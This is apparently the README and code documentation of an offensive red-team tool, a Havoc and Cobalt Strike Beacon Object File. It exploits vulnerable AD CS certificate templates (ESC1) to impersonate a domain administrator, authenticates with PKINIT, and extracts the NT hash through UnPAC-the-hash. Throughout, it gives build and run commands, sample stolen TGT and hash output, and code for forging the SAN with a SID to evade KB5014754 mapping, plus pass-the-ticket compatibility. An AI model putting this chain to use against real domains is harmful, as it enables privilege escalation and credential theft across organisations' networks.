# ESC1-unPAC

Active Directory Certificate Services (ADCS) exploitation BOF for Havoc C2 and Cobalt Strike.

**Complete attack chain:**
1. **ESC1** - Request certificate with arbitrary SAN (Subject Alternative Name), and SID to bypass strong mapping.
2. **PKINIT** - Authenticate to KDC using the certificate
3. **UnPAC-the-hash** - Extract NT hash from PAC credentials

## Quick Start

```bash
# On Kali
git clone https://github.com/RayRRT/ESC1-unPAC.git && cd ESC1-unPAC && chmod +x build.sh && ./build.sh

# In Havoc
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net

# In Cobalt Strike (same command)
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
```

## Output

```
[+] PFX (base64, password: SpicyAD123):
MIIQoQIBAzCCEGcGCSqGSIb3DQEHAaCCEFgEghBUMIIQUDCC...

[+] TGT obtained!
[+] TGT (kirbi, base64):
doIFqjCCBaagAwIBBaEDAgEWooIEtjCCBLJhggSuMIIEqqAD...

[+] NT Hash: 32ed87bdb5fdc5e9cba88547376818d4
```

## Files

```
ESC1-unPAC/
├── README.md
├── Makefile
├── build.sh
├── havoc/
│   ├── esc1-unpac.py           # Havoc extension
│   └── bofs/
│       └── ESC1-unPAC.x64.o    # Compiled BOF
├── cobaltstrike/
│   ├── esc1-unpac.cna          # Cobalt Strike aggressor script
│   └── bofs/
│       └── ESC1-unPAC.x64.o    # Compiled BOF
├── src/adcs/
│   └── esc1-unpac.c            # Complete implementation (single file)
└── include/
    ├── beacon.h
    └── bofdefs.h
```

---

# Code Documentation

## esc1-unpac.c - Complete Implementation (Single File)

### Entry Point

```c
void go(char* args, int alen)
```

BOF entry. Parses arguments using custom ArgParser and calls `DoESC1UnPAC()`.

**Arguments:**
| # | Name | Description | Example |
|---|------|-------------|---------|
| 1 | CA | Certificate Authority | `EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA` |
| 2 | Template | Vulnerable template | `ESC1Template` |
| 3 | UPN | Target user | `administrator@evilcorp.net` |
| 4 | KDC | KDC hostname (optional) | `dc01.evilcorp.net` |
| 5 | nosid | Disable SID (optional) | `nosid` |

### ArgParser (Custom)

```c
typedef struct {
    char* buffer;
    int length;
    int position;
} ArgParser;

static char* ArgParserGetString(ArgParser* p) {
    // Reads: [4-byte length][string data]
    unsigned int strLen = *(unsigned int*)(p->buffer + p->position);
    p->position += 4;
    char* str = p->buffer + p->position;
    p->position += strLen;
    return str;
}
```

**Note:** Both Havoc (.py) and Cobalt Strike (.cna) pack arguments in this format.

### DoESC1UnPAC

```c
void DoESC1UnPAC(char* szCA, char* szTemplate, char* szTargetUPN, char* kdcHost)
```

Main orchestrator:
1. Calls `DoESC1CertRequest()` → gets PFX base64
2. Outputs PFX for user
3. Calls `DoESC1FullChain()` → PKINIT + UnPAC

### DoESC1CertRequest

```c
static char* DoESC1CertRequest(char* szCA, char* szTemplate, char* szTargetUPN, int* pfxLen)
```

Requests certificate with custom SAN from AD CS.

#### Step 1: Key Generation
```c
CryptAcquireContextW(&hProv, wszContainerName, MS_ENHANCED_PROV_W,
                     PROV_RSA_FULL, CRYPT_NEWKEYSET);
CryptGenKey(hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey);
```

#### Step 2: SID Lookup (KB5014754)
```c
LookupUserSID_Unpac(szTargetUPN, &pbUserSID, &dwUserSIDLen);
```
Queries AD via LDAP for target's `objectSid`.

#### Step 3: Build SAN Extension
```c
// UPN entry (OID 1.3.6.1.4.1.311.20.2.3)
altNameEntries[0].dwAltNameChoice = CERT_ALT_NAME_OTHER_NAME;
altNameEntries[0].pOtherName = &otherName;

// SID URL entry (KB5014754 Strong Certificate Mapping)
sprintf(szSidUrl, "tag:microsoft.com,2022-09-14:sid:%s", szSidString);
altNameEntries[1].dwAltNameChoice = CERT_ALT_NAME_URL;
altNameEntries[1].pwszURL = wszSidUrl;
```

#### Step 4: Create & Submit CSR
```c
CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
                              X509_CERT_REQUEST_TO_BE_SIGNED, &reqInfo,
                              &sigAlgo, NULL, pbEncodedReq, &dwEncodedReqLen);

pCertRequest->lpVtbl->Submit(pCertRequest, CR_IN_BASE64 | CR_IN_PKCS10,
                             bstrReq, bstrAttr, bstrCA, &lDisposition);
```

#### Step 5: Export PFX
```c
PFXExportCertStoreEx(hMemStore, &pfxBlob, L"SpicyAD123", NULL, EXPORT_PRIVATE_KEYS);
CryptBinaryToStringA(pfxBlob.pbData, pfxBlob.cbData,
                     CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, resultPfxB64, &dwB64Len);
```

### LookupUserSID_Unpac

```c
static BOOL LookupUserSID_Unpac(const char* szUPN, BYTE** ppSid, DWORD* pdwSidLen)
```

LDAP query for user's SID with **sAMAccountName fallback** for users without UPN:

```c
pLdap = ldap_initW(wszDomain, LDAP_PORT);
ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);

// First try: userPrincipalName
swprintf(wszFilter, L"(userPrincipalName=%s)", wszUPN);
ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);

pEntry = ldap_first_entry(pLdap, pResults);

// Fallback: sAMAccountName (for users without UPN)
if (!pEntry && usernameLen > 0) {
    swprintf(wszFilter, L"(sAMAccountName=%s)", wszSamAccount);
    ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);
    pEntry = ldap_first_entry(pLdap, pResults);
}

ppValues = ldap_get_values_lenW(pLdap, pEntry, L"objectSid");
```

**Note:** Uses heap allocation to avoid BOF stack overflow:
```c
wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
wszBaseDN = (WCHAR*)malloc(512 * sizeof(WCHAR));
```

---

## PKINIT & UnPAC Implementation

### Constants

```c
#define ETYPE_AES256_CTS_HMAC_SHA1  18
#define ETYPE_AES128_CTS_HMAC_SHA1  17

// Key usages (RFC 4120)
#define KRB_KEY_USAGE_AS_REP_ENCPART        3
#define KRB_KEY_USAGE_TGS_REQ_AUTH          7
#define KRB_KEY_USAGE_PAC_CREDENTIAL        16
```

### DH Parameters (RFC 3526 MODP Group 14)

```c
static const BYTE DH_P_MODP2[256];  // 2048-bit prime
static const BYTE DH_G_MODP2[256];  // Generator (2)

static BYTE g_dhPrivateKey[128];    // Our private key
static BYTE g_dhPublicKey[256];     // Our public key
```

### BigInt Implementation

Minimal big integer for DH calculations:

```c
typedef struct {
    DWORD words[64];
    int len;
} BigInt;

static void bigint_modpow(BigInt* result, BigInt* base, BigInt* exp, BigInt* mod);
static void bigint_mul(BigInt* result, BigInt* a, BigInt* b);
static void bigint_sub(BigInt* result, BigInt* a, BigInt* b);
static void bigint_mod(BigInt* result, BigInt* a, BigInt* p);
```

### GenerateDHKeys

```c
static void GenerateDHKeys(HCRYPTPROV hProv)
```

```c
// Generate random private key
CryptGenRandom(hProv, 128, g_dhPrivateKey);

// Compute public key: g^privkey mod p
bigint_modpow(&pubkey, &g, &x, &p);
bigint_to_bytes(&pubkey, g_dhPublicKey, 256);
```

### BuildCmsSignedData

```c
static BYTE* BuildCmsSignedData(PCCERT_CONTEXT pCert, BYTE* content,
                                 int contentLen, int* outLen)
```

Uses Windows CryptoMsg API with correct PKINIT OID:

```c
hMsg = CryptMsgOpenToEncode(
    PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
    0,
    CMSG_SIGNED,
    &signedInfo,
    "1.3.6.1.5.2.3.1",  // id-pkinit-authData OID
    NULL
);
```

**Critical:** The inner content OID must be `id-pkinit-authData`, not default `id-data`.

### BuildAuthPack

```c
static BYTE* BuildAuthPack(const char* user, const char* realm,
                           BYTE* reqBodyHash, int* outLen)
```

Builds RFC 4556 AuthPack:

```
AuthPack ::= SEQUENCE {
    pkAuthenticator [0] PKAuthenticator {
        cusec [0] INTEGER,
        ctime [1] KerberosTime,
        nonce [2] INTEGER,
        paChecksum [3] OCTET STRING  -- SHA-1 of KDC-REQ-BODY
    },
    clientPublicValue [1] SubjectPublicKeyInfo  -- DH public key
}
```

### BuildPkinitAsReq

```c
static BYTE* BuildPkinitAsReq(PCCERT_CONTEXT pCert, const char* user,
                               const char* domain, int* outLen)
```

Complete AS-REQ construction:

1. Build KDC-REQ-BODY
2. Hash body (paChecksum)
3. Build AuthPack with DH key
4. Sign in CMS SignedData
5. Wrap in PA-PK-AS-REQ
6. Build AS-REQ

```
AS-REQ ::= [APPLICATION 10] SEQUENCE {
    pvno [1] INTEGER (5),
    msg-type [2] INTEGER (10),
    padata [3] SEQUENCE OF PA-DATA {
        PA-PK-AS-REQ (type 16)
    },
    req-body [4] KDC-REQ-BODY
}
```

### SendToKdc

```c
static BYTE* SendToKdc(const char* kdcHost, int port, BYTE* data, int dataLen, int* respLen)
```

TCP port 88 with length prefix:

```c
// 4-byte big-endian length
BYTE lenBuf[4];
lenBuf[0] = (requestLen >> 24) & 0xFF;
lenBuf[1] = (requestLen >> 16) & 0xFF;
lenBuf[2] = (requestLen >> 8) & 0xFF;
lenBuf[3] = requestLen & 0xFF;

send(sock, lenBuf, 4, 0);
send(sock, request, requestLen, 0);
```

### ProcessAsRep

```c
static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
                          const char* user, const char* realm, const char* kdcHost)
```

#### Step 1: Check for KRB-ERROR
```c
if (asRep[0] == 0x7E) {
    // Parse error code and display
}
```

#### Step 2: Extract KDC's DH Public Key
```c
BYTE* kdcPubKey = ExtractKdcDhPublicKey(asRep, asRepLen, &kdcPubKeyLen);
```

#### Step 3: Compute Shared Secret
```c
// shared = KDC_pubkey^our_privkey mod p
bigint_modpow(&sharedSecret, &y, &x, &p);
```

#### Step 4: Derive Reply Key (kTruncate - RFC 4556)
```c
DeriveSessionKey(sharedSecretBytes, 128, serverNonce, serverNonceLen, replyKey, 32);
```

#### Step 5: Decrypt enc-part
```c
BYTE* decrypted = KerberosDecrypt(ETYPE_AES256_CTS_HMAC_SHA1,
                                   KRB_KEY_USAGE_AS_REP_ENCPART,
                                   replyKey, 32, encPart, encPartLen, &decryptedLen);
```

#### Step 6: Extract Session Key
```c
BYTE* sessionKey = ExtractSessionKey(decrypted, decryptedLen,
                                      &sessionKeyLen, &sessionKeyType);
```

#### Step 7: Output TGT (Kirbi)
```c
OutputKirbi(kirbiTgt, kirbiTgtLen, sessionKey, sessionKeyLen,
            sessionKeyType, user, realm);
```

#### Step 8: Extract NT Hash
- If PA-PAC-CREDENTIALS present → decrypt and parse
- Otherwise → perform U2U

### OutputKirbi

```c
static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey,
                        int sessionKeyLen, int encType, const char* user,
                        const char* realm)
```

Builds Rubeus-compatible KRB-CRED:

```
KRB-CRED ::= [APPLICATION 22] SEQUENCE {
    pvno [0] INTEGER (5),
    msg-type [1] INTEGER (22),
    tickets [2] SEQUENCE OF Ticket,
    enc-part [3] EncryptedData {
        etype 0,
        cipher: EncKrbCredPart {
            ticket-info [0] SEQUENCE OF KrbCredInfo {
                key [0] EncryptionKey,
                prealm [1] Realm,
                pname [2] PrincipalName,
                srealm [8] Realm,
                sname [9] PrincipalName (krbtgt/REALM)
            }
        }
    }
}
```

**Compatible with:**
- `Rubeus.exe ptt /ticket:<base64>`
- `Rubeus.exe describe /ticket:<base64>`
- Mimikatz `kerberos::ptt`

### KerberosDecrypt / KerberosEncrypt

```c
static BYTE* KerberosDecrypt(int etype, int keyUsage, BYTE* key, int keyLen,
                              BYTE* cipher, int cipherLen, int* plainLen)
```

Uses `cryptdll.dll` internal functions:

```c
HMODULE hCryptDll = LoadLibraryA("cryptdll.dll");
pCDLocateCSystem = GetProcAddress(hCryptDll, "CDLocateCSystem");
pCDLocateCSystem(etype, &pCSystem);
pCSystem->Decrypt(keyUsage, key, keyLen, cipher, cipherLen, plain, plainLen);
```

Same technique as Mimikatz/Rubeus.

### PerformU2U

```c
static void PerformU2U(const char* kdcHost, const char* user, const char* realm,
                       BYTE* tgt, int tgtLen, BYTE* sessionKey, int sessionKeyLen,
                       BYTE* replyKey, int replyKeyLen)
```

User-to-User authentication when PA-PAC-CREDENTIALS not available:

1. Build TGS-REQ: user → user (self-referral)
2. Include TGT in additional-tickets
3. Set `enc-tkt-in-skey` flag
4. KDC encrypts with TGT session key
5. Decrypt ticket and extract PAC

### ParsePacCredentialData

```c
static void ParsePacCredentialData(BYTE* data, int dataLen)
```

Extracts NT hash from PAC_CREDENTIAL_DATA:

```
NTLM_SUPPLEMENTAL_CREDENTIAL {
    version,
    flags,
    ntHash[16]  ← Target
}
```

---

## Compilation

```bash
# Install mingw on Kali
sudo apt install mingw-w64

# Build (compiles to both havoc/bofs and cobaltstrike/bofs)
./build.sh

# Or manually
make
```

### Compiler Flags

```makefile
CFLAGS = -c -Os -fno-stack-protector -fno-asynchronous-unwind-tables
CFLAGS += -masm=intel -fno-ident -Wno-pointer-arith
```

| Flag | Purpose |
|------|---------|
| `-c` | Compile only, no link |
| `-Os` | Optimize for size |
| `-fno-stack-protector` | No stack canaries (BOF requirement) |
| `-fno-asynchronous-unwind-tables` | No .eh_frame |
| `-masm=intel` | Intel assembly syntax |

**Note:** `-ffunction-sections` removed for Cobalt Strike compatibility (CS requires single `.text` section).

---

## Usage

### Havoc
1. Scripts → Load Script → `havoc/esc1-unpac.py`

### Cobalt Strike
1. Script Manager → Load → `cobaltstrike/esc1-unpac.cna`

### Basic
```
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
```

### With Explicit KDC
```
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template admin@evilcorp.net dc01.evilcorp.net
```

### Without SID (Legacy)
```
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template admin@evilcorp.net "" nosid
```

---

## Requirements

### Vulnerable Template
- `ENROLLEE_SUPPLIES_SUBJECT` enabled
- Low privilege enrollment (Authenticated Users)
- Client Authentication EKU

### Domain Controller
- PKINIT enabled (default)
- For full attack: KB5014754 requires SID in cert

---

## References

- [RFC 4556 - PKINIT](https://tools.ietf.org/html/rfc4556)
- [RFC 4120 - Kerberos V5](https://tools.ietf.org/html/rfc4120)
- [RFC 3526 - MODP Groups](https://tools.ietf.org/html/rfc3526)
- [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [KB5014754](https://support.microsoft.com/en-us/topic/kb5014754)
